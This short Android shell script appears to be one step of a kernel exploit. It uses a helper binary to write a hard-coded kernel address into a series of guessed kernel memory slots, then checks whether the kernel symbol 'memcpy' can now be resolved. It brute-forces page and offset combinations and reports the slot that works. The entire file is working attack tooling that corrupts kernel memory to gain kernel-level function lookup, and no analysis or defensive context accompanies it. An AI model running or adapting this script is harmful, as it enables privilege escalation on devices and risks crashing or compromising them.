#!/system/bin/sh
# SPDX-License-Identifier: MIT
D=/data/local/tmp
GW=$D/gaw64
KF=$D/kfunc_new
KLN=ffffffc00111e5d0

# pages that survived a +0x7a0 write (so not a critical structure)
for PG in 20a5000 20a7000 2093000 20a3000; do
  for OFF in fa0 8a0 9a0 aa0 ba0 ca0 da0 ea0; do
    P=$PG$OFF
    echo "=== try $P (page $PG + 0x$OFF)"
    $GW $P $KLN >/dev/null 2>&1 || { echo "  write fail"; continue; }
    R=$($KF sym memcpy 2>&1 | tail -1)
    echo "  $R"
    case "$R" in
      *memcpy*=0x*) 
        A=$(echo "$R" | sed 's/.*=0x\([0-9a-f]*\).*/\1/')
        echo ">>> RESOLVED memcpy=0x$A at SLOT=$P"
        exit 0
        ;;
      *ffffff*) echo ">>> HIT-ish at $P : $R"; exit 0;;
    esac
  done
done
echo "no hit"
exit 2
